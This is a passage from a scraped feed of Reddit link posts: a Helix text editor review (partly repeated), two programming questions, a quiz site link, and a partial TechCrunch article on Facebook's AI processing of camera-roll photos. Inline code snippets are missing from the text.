list, restrict the selection in basic ways (e.g. by\n              location, tag or creation time), and get exactly what I want out of it.\n            </p><p>Does this sound complicated? It isn’t.</p><p>It’s all the same three or four keybinds + the basic Vim ones.</p><p>\n              It’s  faster than figuring out how to use  again, or writing a Python\n              script to process this data.</p><p>Handling unstructed data like that is pretty neat. Of course, you can do the same when handling code.</p><p>\n              Nowadays most programming languages that people actually use have LSPs, meaning that fancy selection-based\n              editing to e.g. rename functions is not all that useful.\n            </p><p>I still get some mileage out of it. Here are some tricks I like to use now and then:</p><ul><li>Easily extract a list of all function signatures from a file.</li><li>Sort a list of constants, or edit them all at once.</li><li>\n                Count the number of elements in a list by splitting the selection such that each element is selected\n                individually. Helix shows the number of selections at the bottom of the screen.\n              </li><li>\n                Replace all usages of some deprecated function  with  at the same\n                time.\n              </li><li>\n                Add a debug-print statement that prints <code>\"{FUNCTION_NAME} entered!\"</code> for every single\n                function in your file at the same time.\n              </li><li>\n                Select and extract all  comments in your code. Maybe aggregate them in a new\n                document.\n              </li><li>\n                Trivially align/format all arms in a match statement or table using . (Up to you when\n                this is a good option over using a formatter.)\n              </li></ul><p>\n              Even if none of this is particularly interesting, at its worst Helix is still “Vim, except no config or\n              plugin shuffling required, and with better defaults, and where making large scale search-and-replace edits\n              doesn’t require dealing with minor bespoke interfaces tacked onto the editor.”.\n            </p><p>And that is, imo, a pretty good deal already.</p><p>\n              Most of these are pretty harmless, and pretty deep in the “You’ll know if they apply to you.” territory.\n              For example:\n            </p><ul><li>\n                Do you frequently use machines on which you do not have blanket install rights? Tough luck, as far as\n                Linux servers go, Vim is basically . Helix isn’t. If you can’t  Helix\n                where you work, it’s probably not the editor you should invest time into!\n              </li><li>\n                Are you married to your existing Vim keybinds? Does the thought of having to relearn a few old coding\n                habits pain you? Helix gets rid of keybinds such as  or .\n                 in favor of , where  selects the whole line, while\n                 deletes whatever you have selected right now. This follows the ‘selection first’\n                principle. First you select something,  you apply some action. There’s a lot of more\n                obscure ones that don’t work either.\n              </li><li>\n                Are you working with highly specific languages or software? Preferably the type that requires a\n                specialized editor, e.g. Jupyter notebooks or LaTeX. You  make these work in Vim. The Vim\n                plugin system is pretty extensive. With Helix you’ll be out of luck.\n              </li><li>\n                Does the thought of interacting with the terminal scare you, or are you fully comfortable using VSCode\n                or Eclipse or whatever else there is? Well, Helix might not be for you.\n                <a href=\"https://zed.dev/\" target=\"_blank\">Zed</a> is apparently working in adding\n                <a href=\"https://zed.dev/releases/preview/0.193.0\" target=\"_blank\">Helix-support</a>, so that might be\n                an option.\n              </li></ul><p>\n              As a final point: If you have tried to ‘get into Vim’, but never managed to, then\n              .\n            </p><p>\n              The same applies if you’re just curious about modal editors, and just never got around to using one. Helix\n              is easy, and about as user friendly as it gets. Just install it and enter  to get\n              started.\n            </p><p>\n              I was considering to break this up into a separate article, but it doesn’t really make sense. Most of my\n              thoughts here are just nitpicks.\n            </p><p>\n              But let’s quickly go over them, and talk about what’s missing, or what I didn’t manage to fit into the\n              article so far.\n            </p><p>\n              If you’ve read the entire article up to this point it might surprise you to hear this, but the Helix\n              developers are <em>working on a plugin system</em> for Helix.\n            </p><p>\n              This has been in the work\n              <a href=\"https://github.com/helix-editor/helix/discussions/3806\" target=\"_blank\">for a while</a> and\n              remains the most controversial topic in the community.\n            </p><p>Wait, you don’t even know the funniest part yet!</p><p>\n              The language of choice for writing plugins is planned to be . Or rather,\n              <a href=\"https://github.com/mattwparas/steel\" target=\"_blank\">Steel</a> an embeddable Scheme-dialect.\n              Considering\n              <a href=\"https://en.wikipedia.org/wiki/Editor_war\" target=\"_blank\">Vim’s history with Emacs</a>, and\n              <a href=\"https://en.wikipedia.org/wiki/Emacs_Lisp\" target=\"_blank\">Emacs language of choice</a>, there’s\n              something poetic about this. I know some people would prefer Lua, Rust, or even Javascript, but frankly,\n              I’m quite happy with Scheme.\n            </p><p>It has some real THESIS / ANTITHESIS / SYNTHESIS energy, if you get what I am saying.</p><p>\n              It might surprise you to hear that I’m looking forward to this. I don’t dislike plugin-systems per se, and\n              am excited to see how this is going to play out. Considering Helix’s solid foundation, I’m not sure if\n              I’ll use any of them, but we’ll see.\n            </p><ul><li>\n                There are performance issues with handling really,  long lines upwards of 100_000\n                characters in a single line. (Don’t ask me what sort of cursed stuff I was doing that I ran into this.)\n              </li><li>\n                Entering view mode glues the main cursor to the viewport. This one is absolutely baffling to me. When I\n                select say, 20 occurences of text throughout the entire file and start scrolling around, then the ‘main’\n                selection will ‘move around’ to stay inside of the window. This predictably leads to it being in the\n                completely wrong place and to dropping the original selection. This one doesn’t make sense to me\n                whatsoever.\n              </li><li>\n                AI-based Code Completion isn’t supported yet.\n                <a href=\"https://github.com/leona/helix-gpt\" target=\"_blank\">There’s a fork that supports it</a>, but\n                I’ve got no reason to switch for some slightly fancier autocomplete features. I can’t blame the Helix\n                people for putting this off. If I were in their position I’d either wait until there’s a standard\n                protocol (like LSPs) or get the plugin system ready, such that people can build their own support for\n                it.\n              </li><li>\n                The interaction between the LSP and multi-cursors is not ideal. For example, if I have multiple cursors\n                and ask for an LSP code transformation (such as inlining a function), it will only be applied at a\n                single cursor. It makes sense why this is: There’s no guarantee we could get the same transformation at\n                every single cursor, since there’s no guarantee that they’ll even all point at viable functions. That\n                said, it’d be neat if there were  way to improve on this and say “Try to apply this at\n                every cursor.” Trying to work around this using macros doesn’t quite seem to work either.\n              </li></ul><p>Finally, here’s a big one.</p><p>This one is less of a nitpick and more of a personal pipedream, though.</p><p>\n              What I’d  like to see from Helix is the ability to have multi-cursors across multiple\n              files.\n            </p><p>\n              Manipulation within a single file is all nice and good, but it doesn’t get you all that far. I’d get a\n              real productivity boost out of the ability to select  usages of a function across my entire\n              workspace, and to edit all of my selections at the same time.\n            </p><p>\n              I’ve already made the case above: ‘Search and replace’ is one of the fundamental operations of editing. It\n              should  be a tacked-on menu. It should compose with the main editor operations.\n            </p><p>\n              I don’t see how we could possibly get there, other than by allowing selections across multiple files, and\n              having reasonable abstractions on top of them.\n            </p><p>\n              We already have multi-cursors, why not take it even further? Let me create and handle all cursors across\n              some arbitrary number of buffers at the same time. Give me the ability to select  code, across\n               of my files, etc.\n            </p><p>\n              I’d still love to see it happen and, yes, believe that I’d get legitimate use out of this for reasonably\n              large-scale migrations and code transformations.\n            </p>","contentLength":24104,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lmo3p2/i_really_like_the_helix_editor/"},{"title":"I really like the Helix editor.","url":"https://herecomesthemoon.net/2025/06/i-like-helix/","date":1751120692,"author":"/u/SophisticatedAdults","guid":174489,"unread":true,"content":"<p>\n              The <a href=\"https://helix-editor.com/\" target=\"_blank\">Helix editor</a> is a modal\n              (read: Vim-like) <a href=\"http://kakoune.org/\" target=\"_blank\">Kakoune-inspired</a> ‘batteries included’\n              terminal editor with sane defaults and a focus on multiple cursors and selection-based editing.\n            </p><p>There are a lot of reasons to like the Helix editor.</p><p>\n              One of my favorite ones is how good it is at handling vaguely structured data (e.g. structured logs, JSON\n              output, etc.), outside of the realm of standard LSP-powered code editing. More about that later.\n            </p><p>\n              That’s also when I’ll tell you why, yes, that ‘search and replace in file’ popup most modern editors have\n              is actually Bad™.\n            </p><p>\n              Here’s a demo of me using Helix to process a large JSON file. I’m extracting a list of all locations of\n              resources deployed in 2025 with just a few keypresses. It’s not very hard. Pay special attention to the\n               in the lower right corner.\n            </p><div><figure data-imgstate=\"dither\"><div><figcaption></figcaption></div></figure></div><p>\n              One last thing before we get started: I’ll compare Helix to Vim in the following, but don’t make the\n              mistake of assuming that I’d be happier with e.g. VSCode. Many of my reasons for disliking VSCode are\n              pretty similar to my reasons for disliking Vim, and this includes the\n              <a href=\"https://stackoverflow.com/questions/4087999/shortcut-for-replace-button-in-find-and-replace-dialog?rq=3\" target=\"_blank\">issues with highly context-specific and hard to learn keybinds</a>.\n            </p><h2>\n              Getting the obvious one out of the way: It just works.\n            </h2><p>\n              Everything just works out of the box. It’s a pretty massive difference from the world of Vim, where a\n              significant investment to figure out how to customize your editor to your liking is required.\n            </p><p>\n              A barebones Neovim install neither has Treesitter set up nor manages to connect to my installed LSPs! Not\n              without first dealing with some\n              <a href=\"https://github.com/neovim/nvim-lspconfig\" target=\"_blank\">config fiddling and plugin setup</a>,\n              anyway.\n            </p><p>\n              (If you’re not familiar with LSPs, basically all semantics-aware features of (most) modern IDEs are\n              handled by the Language Server Protocol (LSP). This includes ‘red squiggles’ beneath errors, renaming\n              variables, jumping to definitions, autocompletion, and so on. What this basically means is that as long as\n              your editor supports LSPs, it can do <em>all of the same stuff VSCode does</em>. This makes switching\n              between modern editors pretty painless, as far as capabilities go. Most of them use the same LSPs!)\n            </p><p>\n              In Helix, if I press a button such as  (which still corresponds to , just\n              like in Vim), it will automatically pop up a list of available options for me. If I press\n               (which corresponds to a bunch of ‘higher level’ operations or interactions with\n              specific tools), the same happens. See for yourself:\n            </p><p>\n              I cannot overstate how big of a deal this feature is. Discoverability is a big deal. If your users don’t\n              know that a feature exists, they won’t use it. If they don’t even know how to easily figure out\n               a feature they’re looking for exists, it’s basically game over.\n            </p><p>\n              There’s a few more examples of easy usability.  and <a href=\"https://docs.helix-editor.com/keymap.html#unimpaired\" target=\"_blank\">work as in Vim-unimpaired</a>, and allow you to jump to the previous/next function, test, diagnostic, paragraph, change, etc.\n            </p><p>\n              Likewise,  allows manipulation of ‘surrounding’ characters or syntactic structures. This\n              includes jumping between pairs of brackets, selecting a string literal, test, or function, diff, etc.\n            </p><p>\n              This is nice! Treesitter is nice. I don’t know how easy it is to delete a function or testcase in your\n              editor of choice, but there’s something nice about the fact that I can just type  to\n              select an entire function, and then delete it with a single button press. (And, most importantly, that the\n              same principle extends to everything else.)\n            </p><p>\n              The fuzzy pickers are great. I can type  and get a fuzzy picker that shows all\n              available editor commands or  to get a fuzzy finder over all symbols (e.g.\n              function names) across the entire repository, and then immediately jump to them.\n            </p><p>\n              All of the pickers work in the same unified way, even! It’s like\n              <a href=\"https://github.com/nvim-telescope/telescope.nvim\" target=\"_blank\">Nvim’s Telescope</a>, except\n              there’s no need to scroll through a Github page through multiple dependency sections, an install section\n              with four different options (depending on which plugin manager you’re using), and a long list of commands\n              that you first need to map to your own personal keybinds.\n            </p><p>\n              You probably lose  customizability, but “I have a deep, intense need to customize the way my\n              fuzzy finder editor plugin integrates into my bespoke coding workflow and external dependencies.” falls\n              firmly into the category of “Sentences spoken by the utterly deranged” for me.\n            </p><p>\n              Anyway, just in case you’re getting worried we’re losing the fundamentals, all of the ‘standard’ Vim\n              features are supported. The keybinds are somewhat different, but similar enough that picking it up and\n              being productive didn’t take very long.\n            </p><p>I was productive in ~2 hours, and have been using it as my daily driver for over a year by now.</p><p>\n              I can record macros and replay them. I can type  to pipe each of my selections into a shell\n              command and replace them with the output. I can yank to registers, paste, search for regex patterns, split\n              and tile my screen, jump around in various ways, etc.\n            </p><p>Don’t get me wrong, Vim’s customizability and plugin system are one of its biggest strengths.</p><p>\n              This is why Vim is capable of handling\n              <a href=\"https://github.com/jupyter-vim/jupyter-vim\" target=\"_blank\">Jupyter Notebooks</a>, which is\n               something you can say about Helix (for now).\n            </p><p>\n              That doesn’t change the equation, though: Requiring everyone to do their own bespoke setup and config\n              fiddling isn’t great. That’s a lot of time people have to put into it just for some basic functionality,\n              and in the end  will end up with something slightly different.\n            </p><p>\n              Anyway. I acknowledge that “Helix is basically like Vim, except everything works out of the box, and you\n              don’t have to deal with 30 year old historical baggage.” isn’t much of a selling point for people who’ve\n              already spent hours setting up an entire dependency chain of Vim plugins on their computer.\n            </p><p>\n              That’s fine by me. As for myself, I’m tired of shaving that particular yak. I want something that “just\n              works”  has a composable modal interface.\n            </p><p>\n              I much prefer to shave other, slightly less hairy yaks. Preferably ones that are marginally closer to the\n              projects I’m actually interested in working on, y’see.\n            </p><p>\n              Before we get into the whole selection-based editing part (aka ‘stuff that makes Helix unique and is\n              cool’), here’s my entire Helix config:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"toml\"></code></pre></div><p>\n              Please take note of how short it is. This is what I used when writing this very post.</p><p>\n              Meanwhile, in the world of Vim you find\n              <a href=\"https://github.com/ntk148v/neovim-config\" target=\"_blank\">Github repositories</a> that\n              self-describe as ‘minimal neovim configuration’ and contain over a dozen files of Lua and a few hundred\n              lines of code full of side effects.\n            </p><p>\n              Needless to say, I’m not much of a fan of fancy ‘Vim-with-batteries-included’ setups like\n              <a href=\"https://www.lunarvim.org/\" target=\"_blank\">LunarVim</a> either.\n            </p><p>\n              LunarVim essentially stacks a ton of plugins on top of Neovim to make it look like VSCode. I’ve never been\n              a fan, honestly. When I used Neovim, even a moderate amount of plugin resulted in some performance issues,\n              whereas Helix just feels a lot , and less brittle.\n            </p><p>If you’re into this, more power to you. It’s just not for me.</p><p>\n              What I  like about Helix is its ability to manipulate to easily manipulate multiple\n              selections and cursors. It gives you a few basic, very powerful tools, which I reach for\n              , just because of how versatile they are.\n            </p><p>\n              You’ve already seen me use multi-cursor editing in the demo video at the start of the post. I’ll go into\n              more detail in this section.\n            </p><p>\n              When writing , using the Language Server to ‘rename a variable’ is pretty easily the best\n              workflow there is. It will query all of the usages, and just rename them. It will even return an error if\n              you run into name collision issues.\n            </p><p>\n              When that doesn’t work for whatever reason, you’re usually forced to reach for second-class tools such as\n              Vim’s terrible  workflow or the standard GUI search-and-replace\n               (which is also terrible).\n            </p><p>\n              If it’s not clear why the search-and-replace popup window is bad, it’s because it’s “glued onto” the main\n              editor, and poorly interacts with the rest of the program.\n            </p><ol><li>\n                It results in the existence of ’editor focus’. Your editor will either be focused on the popup window or\n                on the main input window, both of which have their own keybinds and behavior. Even switching this focus\n                probably requires its own keybind, separate from alt-tabbing.\n              </li></ol><p>\n              It’s just so much more fiddly and complex than it has any right to be.\n              <em>Editing text should leverage the main editor window and input methods, not have its own bespoke\n                interface. This is the GUI equivalent of a bespoke DSL that doesn’t compose with anything else.</em></p><p>In Helix, what you would instead do is the following:</p><ol><li>Press . This selects the entire file.</li><li>Press . This opens a ‘select’ input field in the command bar.</li><li>\n                Type . This will narrow down your current selection to only select all matches of\n                . In other words, you now have every match of  in your file selected.\n              </li><li>Type . This replaces each selection with a cursor, and puts you into insert mode.</li><li>Type . You’re editing all instances at the same time.</li></ol><p>\n              And you’re done. The reason why this is so powerful is that it . Instead of having to\n              find a single regex which matches  instance of your string (or having to write a macro), you\n              can narrow it down using repeated applications of  or other selection-primitives.\n            </p><p>\n              Other selection-primitives include (for example)  (for keeping only those selections that\n              include a given pattern) or  for removing those that contain a given pattern,\n               for selecting an entire line,  for trimming whitespace and the whole\n              selection of  keybinds for selecting quotes or braces.\n            </p><p>\n              This gets fancier with Treesitter features: Take some arbitrary Rust file. Press , then\n              , then type , and you selected the  keyword in every\n              top-level function. Now press , to extend the selection to the surrounding syntactic\n              element, i.e. the entire function.\n            </p><p>\n              This is stuff you can do. It’s easy. It might sound like a fancy gimmick—and that’s because it is—but that\n              doesn’t keep it from being composable and easy.\n            </p><h3>Handling semi-structured logs</h3><p>\n              Perhaps my first real ‘programming project’ was a Discord bot, written in Python and using\n              <a href=\"https://discordpy.readthedocs.io/\" target=\"_blank\">Discordpy</a>. It’s still running to this day,\n              and had an uptime of a full year before I decided to update it not too long ago.\n            </p><p>I  proud of it, but it’s by no means an example of excellent engineering practices.</p><p>My Discord bot spits out logs that look something like this here:</p><div><pre tabindex=\"0\"><code data-lang=\"toml\"></code></pre></div><p>\n              Wow, that sure looks like ass. I sure wish there were a way to  and inspect this\n              file. Something that would make it easy to figure out what’s going on without having scroll through the\n              thing carefully looking for whatever entry I might be looking for.\n            </p><ol><li>\n                Select the whole file, then use  to split my selection into lines. I now have selected\n                each line individually.\n              </li><li>\n                Press , and then  to only keep those lines that  start\n                with a number.\n              </li><li>\n                Press  to delete all of them. Now all of the traceback lines are gone. (I might need them\n                later, but for now I’m just considering them noise.)\n              </li></ol><p>\n              Using a similar approach, I can delete all lines that only contain an  log, and all logs\n              that are too old, or those that don’t contain certain keywords that I am looking for, etc.\n            </p><p>\n              I arrive at a very slim, trimmed down log file that only contains the information I need. It takes me a\n              few seconds, and is not hard to learn. I already told you all of the keybinds.\n            </p><p>\n              I’ve not seen a single tool that makes processing semi-structured data  easy. It’s laughably\n              flexible.\n            </p><h3>Curl, JSON, Config files…</h3><p>\n              Imagine you’re calling some sort of API and ask it to list all of your . You might be\n              using , and just want to quickly figure something out here.\n            </p><p>Say, you’re interested in figuring out all the locations in which you’ve got widgets deployed.</p><p>\n              For the sake of the argument and considering the absolute state of modern software development, let’s\n              assume there’s no easier way of doing this. In fact, the web portal associated with the API is a dumpster\n              fire and would require you to scroll through a few dozen pages of widgets and count manually.\n            </p><p>\n              The widget schema might be something like this here, and your curl call will spit out a whole list of\n              objects in this format.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"json\"></code></pre></div><p> you could pipe your  call directly into Helix.</p><p>At that point it’s simple, and doesn’t require learning a bespoke DSL.</p><p> how you end up at the demo from the intro. That’s a workflow of a few seconds which allows\n              me to pick any arbitrary sub-value out of the list, restrict the selection in basic ways (e.g. by\n              location, tag or creation time), and get exactly what I want out of it.\n            </p><p>Does this sound complicated? It isn’t.</p><p>It’s all the same three or four keybinds + the basic Vim ones.</p><p>\n              It’s  faster than figuring out how to use  again, or writing a Python\n              script to process this data.</p><p>Handling unstructed data like that is pretty neat. Of course, you can do the same when handling code.</p><p>\n              Nowadays most programming languages that people actually use have LSPs, meaning that fancy selection-based\n              editing to e.g. rename functions is not all that useful.\n            </p><p>I still get some mileage out of it. Here are some tricks I like to use now and then:</p><ul><li>Easily extract a list of all function signatures from a file.</li><li>Sort a list of constants, or edit them all at once.</li><li>\n                Count the number of elements in a list by splitting the selection such that each element is selected\n                individually. Helix shows the number of selections at the bottom of the screen.\n              </li><li>\n                Replace all usages of some deprecated function  with  at the same\n                time.\n              </li><li>\n                Add a debug-print statement that prints <code>\"{FUNCTION_NAME} entered!\"</code> for every single\n                function in your file at the same time.\n              </li><li>\n                Select and extract all  comments in your code. Maybe aggregate them in a new\n                document.\n              </li><li>\n                Trivially align/format all arms in a match statement or table using . (Up to you when\n                this is a good option over using a formatter.)\n              </li></ul><p>\n              Even if none of this is particularly interesting, at its worst Helix is still “Vim, except no config or\n              plugin shuffling required, and with better defaults, and where making large scale search-and-replace edits\n              doesn’t require dealing with minor bespoke interfaces tacked onto the editor.”.\n            </p><p>And that is, imo, a pretty good deal already.</p><p>\n              Most of these are pretty harmless, and pretty deep in the “You’ll know if they apply to you.” territory.\n              For example:\n            </p><ul><li>\n                Do you frequently use machines on which you do not have blanket install rights? Tough luck, as far as\n                Linux servers go, Vim is basically . Helix isn’t. If you can’t  Helix\n                where you work, it’s probably not the editor you should invest time into!\n              </li><li>\n                Are you married to your existing Vim keybinds? Does the thought of having to relearn a few old coding\n                habits pain you? Helix gets rid of keybinds such as  or .\n                 in favor of , where  selects the whole line, while\n                 deletes whatever you have selected right now. This follows the ‘selection first’\n                principle. First you select something,  you apply some action. There’s a lot of more\n                obscure ones that don’t work either.\n              </li><li>\n                Are you working with highly specific languages or software? Preferably the type that requires a\n                specialized editor, e.g. Jupyter notebooks or LaTeX. You  make these work in Vim. The Vim\n                plugin system is pretty extensive. With Helix you’ll be out of luck.\n              </li><li>\n                Does the thought of interacting with the terminal scare you, or are you fully comfortable using VSCode\n                or Eclipse or whatever else there is? Well, Helix might not be for you.\n                <a href=\"https://zed.dev/\" target=\"_blank\">Zed</a> is apparently working in adding\n                <a href=\"https://zed.dev/releases/preview/0.193.0\" target=\"_blank\">Helix-support</a>, so that might be\n                an option.\n              </li></ul><p>\n              As a final point: If you have tried to ‘get into Vim’, but never managed to, then\n              .\n            </p><p>\n              The same applies if you’re just curious about modal editors, and just never got around to using one. Helix\n              is easy, and about as user friendly as it gets. Just install it and enter  to get\n              started.\n            </p><p>\n              I was considering to break this up into a separate article, but it doesn’t really make sense. Most of my\n              thoughts here are just nitpicks.\n            </p><p>\n              But let’s quickly go over them, and talk about what’s missing, or what I didn’t manage to fit into the\n              article so far.\n            </p><p>\n              If you’ve read the entire article up to this point it might surprise you to hear this, but the Helix\n              developers are <em>working on a plugin system</em> for Helix.\n            </p><p>\n              This has been in the work\n              <a href=\"https://github.com/helix-editor/helix/discussions/3806\" target=\"_blank\">for a while</a> and\n              remains the most controversial topic in the community.\n            </p><p>Wait, you don’t even know the funniest part yet!</p><p>\n              The language of choice for writing plugins is planned to be . Or rather,\n              <a href=\"https://github.com/mattwparas/steel\" target=\"_blank\">Steel</a> an embeddable Scheme-dialect.\n              Considering\n              <a href=\"https://en.wikipedia.org/wiki/Editor_war\" target=\"_blank\">Vim’s history with Emacs</a>, and\n              <a href=\"https://en.wikipedia.org/wiki/Emacs_Lisp\" target=\"_blank\">Emacs language of choice</a>, there’s\n              something poetic about this. I know some people would prefer Lua, Rust, or even Javascript, but frankly,\n              I’m quite happy with Scheme.\n            </p><p>It has some real THESIS / ANTITHESIS / SYNTHESIS energy, if you get what I am saying.</p><p>\n              It might surprise you to hear that I’m looking forward to this. I don’t dislike plugin-systems per se, and\n              am excited to see how this is going to play out. Considering Helix’s solid foundation, I’m not sure if\n              I’ll use any of them, but we’ll see.\n            </p><ul><li>\n                There are performance issues with handling really,  long lines upwards of 100_000\n                characters in a single line. (Don’t ask me what sort of cursed stuff I was doing that I ran into this.)\n              </li><li>\n                Entering view mode glues the main cursor to the viewport. This one is absolutely baffling to me. When I\n                select say, 20 occurences of text throughout the entire file and start scrolling around, then the ‘main’\n                selection will ‘move around’ to stay inside of the window. This predictably leads to it being in the\n                completely wrong place and to dropping the original selection. This one doesn’t make sense to me\n                whatsoever.\n              </li><li>\n                AI-based Code Completion isn’t supported yet.\n                <a href=\"https://github.com/leona/helix-gpt\" target=\"_blank\">There’s a fork that supports it</a>, but\n                I’ve got no reason to switch for some slightly fancier autocomplete features. I can’t blame the Helix\n                people for putting this off. If I were in their position I’d either wait until there’s a standard\n                protocol (like LSPs) or get the plugin system ready, such that people can build their own support for\n                it.\n              </li><li>\n                The interaction between the LSP and multi-cursors is not ideal. For example, if I have multiple cursors\n                and ask for an LSP code transformation (such as inlining a function), it will only be applied at a\n                single cursor. It makes sense why this is: There’s no guarantee we could get the same transformation at\n                every single cursor, since there’s no guarantee that they’ll even all point at viable functions. That\n                said, it’d be neat if there were  way to improve on this and say “Try to apply this at\n                every cursor.” Trying to work around this using macros doesn’t quite seem to work either.\n              </li></ul><p>Finally, here’s a big one.</p><p>This one is less of a nitpick and more of a personal pipedream, though.</p><p>\n              What I’d  like to see from Helix is the ability to have multi-cursors across multiple\n              files.\n            </p><p>\n              Manipulation within a single file is all nice and good, but it doesn’t get you all that far. I’d get a\n              real productivity boost out of the ability to select  usages of a function across my entire\n              workspace, and to edit all of my selections at the same time.\n            </p><p>\n              I’ve already made the case above: ‘Search and replace’ is one of the fundamental operations of editing. It\n              should  be a tacked-on menu. It should compose with the main editor operations.\n            </p><p>\n              I don’t see how we could possibly get there, other than by allowing selections across multiple files, and\n              having reasonable abstractions on top of them.\n            </p><p>\n              We already have multi-cursors, why not take it even further? Let me create and handle all cursors across\n              some arbitrary number of buffers at the same time. Give me the ability to select  code, across\n               of my files, etc.\n            </p><p>\n              I’d still love to see it happen and, yes, believe that I’d get legitimate use out of this for reasonably\n              large-scale migrations and code transformations.\n            </p>","contentLength":24104,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lmo1q5/i_really_like_the_helix_editor/"},{"title":"[P] How to extract internal references in a document","url":"https://www.reddit.com/r/MachineLearning/comments/1lmnthx/p_how_to_extract_internal_references_in_a_document/","date":1751120082,"author":"/u/Brilliant-Ninja4476","guid":174654,"unread":true,"content":"<p>I have technical documents which consists of text passages that can contain internal references to other text passages in the same document (e.g. \"see section 2.3.4\" or \"described in the preceding paragraph\" or \"as defined in 2.5.7\", \"see paragraphs 2.3 and 3.4\", see definitions 1.5 - 1.9). The text passages begins with the structural elements:</p><pre><code>Section 2.3.4 This Text is about ... Table 2: Shows ... 2.3.4 Machine Learning is defined as .... </code></pre><p>Task: extract all internal references and matched them with the referenced text passage.Only internal references should be extracted, not external references to other documents (as e.g. \"see paragraph 2.3 of doucment xy\"). There can bei one, more or none internal reference in a text passage.</p><p>Pure pattern matching with regex will not work. Because there are \"soft\" references which not use consistant keywords. Moreover there are \"relative\" references as \"in the last two sections\" which can only be determined using knowledge about the position of the passage and the document hierarchy.</p><p>There exists a small Ground Truth for 1 document in form of a numbered list of all text passages and for each passage the number of the passages referenced in the text. But the actual reference (like \"see 2.3.4\") is not listed nor the begin/end spans about the location of these references in the passage.</p><p>So I don't know if I can train a NER ot other NLP model that can recognize this references.</p><p>Any other Ideas? Thanks in advance for any help</p>","contentLength":1475,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Gameboy Advance Coding","url":"https://www.reddit.com/r/programming/comments/1lmn9gd/gameboy_advance_coding/","date":1751118536,"author":"/u/JibanyanX","guid":174425,"unread":true,"content":"<p>Hi Guys, maybe some of you know Yo-kai Watch. I want to make a gba Yo-kai Watch Game. How do I start, which Programms do I need, and which languages are possible? If you help me and I made the game, I will add the link to github. So you can download it. sorry for my bad english</p>","contentLength":278,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"endlessquiz.party: I built an endless real time quiz where hundreds of people can go head to head to get the longest correct answer streak.","url":"https://endlessquiz.party/","date":1751117953,"author":"/u/josh_developer","guid":174455,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lmn24a/endlessquizparty_i_built_an_endless_real_time/"},{"title":"Facebook is asking to use Meta AI on photos in your camera roll you haven’t yet shared","url":"https://techcrunch.com/2025/06/27/facebook-is-asking-to-use-meta-ai-on-photos-in-your-camera-roll-you-havent-yet-shared/","date":1751115266,"author":"/u/F0urLeafCl0ver","guid":175097,"unread":true,"content":"<p>Facebook is asking users for access to their phone’s camera roll to automatically suggest AI-edited versions of their photos — including ones that haven’t been uploaded to Facebook yet. </p><p>The feature is being suggested to Facebook users when they’re creating a new Story on the social networking app. Here, a screen pops up and asks if the user will opt into “cloud processing” to allow creative suggestions. </p><p>As the pop-up message explains, by clicking “Allow,” you’ll let Facebook generate new ideas from your camera roll, like collages, recaps, AI restylings, or photo themes. To work, Facebook says it will upload media from your camera roll to its cloud (meaning its servers) on an “ongoing basis,” based on information like time, location, or themes.</p><p>The message also notes that only you can see the suggestions, and the media isn’t used for ad targeting. </p><p>However, by tapping “Allow,” you are agreeing to <a href=\"https://www.facebook.com/legal/ai-terms\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">Meta’s AI Terms of Service</a>. This allows your media and facial features to be analyzed by AI, it says. The company will additionally use the date and presence of people or objects in your photos to craft its creative ideas.</p><p>The creative tool is another example of the slippery slope that comes with sharing our personal media with AI providers. Like other tech giants, Meta has grand AI ambitions. Being able to tap into the personal photos users haven’t yet shared on Facebook’s social network could give the company an advantage in the AI race. </p><p>Unfortunately for end users, in tech companies’ rush to stay ahead, it’s not always clear what they’re agreeing to when features like this appear.</p><p>According to Meta’s AI Terms around image processing, “once shared, you agree that Meta will analyze those images, including facial features, using AI. This processing allows us to offer innovative new features, including the ability to summarize image contents, modify images, and generate new content based on the image,” the text states.</p><p>The same AI terms also give Meta’s AI the right to “retain and use” any personal information you’ve shared in order to personalize its AI outputs. The company notes that it can review your interactions with its AI, including conversations, and those reviews may be conducted by humans. The terms don’t define what Meta considers personal information, beyond saying it includes “information you submit as Prompts, Feedback, or other Content.”</p><p>We have to wonder whether the photos you’ve shared for “cloud processing” also count here.</p><p>So far, there hasn’t been much backlash about this feature. A handful of Facebook users have <a href=\"https://hachyderm.io/@killyourfm@layer8.space/114599337638960043\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">stumbled</a> across the AI-generated photo suggestions when creating a new story and raised questions about it. For instance, <a href=\"https://www.reddit.com/r/assholedesign/comments/1lkz8t9/facebook_is_now_inputting_your_photos_into_meta/\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">one user on Reddit</a> found that Facebook had pulled up an old photo (in this case, one that had previously been shared to the social network) and automatically turned it into an anime using Meta AI.</p><p>We also found this feature under Facebook’s Settings, where it’s listed in the Preferences section. </p><p>On the “Camera roll sharing suggestions” page, there are two toggles. The first lets Facebook suggest photos from your camera roll when browsing the app. The second (which should be opt-in based on the pop-up that requested permission in Stories) is where you could enable or disable the “cloud processing,” which lets Meta make AI images using your camera roll photos. </p><p>This additional access to use AI on your camera roll’s photos does not appear to be new. </p><p>We found posts from earlier this year where confused Facebook users were sharing screenshots of the pop-up message that appeared in their Stories section. Meta has also <a href=\"https://www.facebook.com/help/1243459406996869/?helpref=uf_share\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">published complete Help Documentation</a> about the feature for both iOS and Android users.</p><p>Meta’s AI terms have been enforceable as of June 23, 2024; we can’t compare the current AI terms with older versions because Meta doesn’t keep a record, and previously published terms haven’t been properly saved by the Internet Archive’s Wayback Machine.</p><p>Since this feature dips into your camera roll, however, it extends beyond what Meta had previously announced, in terms of <a href=\"https://techcrunch.com/2018/05/02/facebook-is-using-your-instagram-photos-to-train-its-image-recognition-ai/\">training</a> its AI on your publicly shared data, including posts and comments on Facebook and Instagram. (EU users had <a href=\"https://www.euronews.com/next/2025/05/13/meta-is-about-to-use-europeans-social-posts-to-train-its-ai-heres-how-you-can-prevent-it\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">until May 27, 2025</a>, to <a 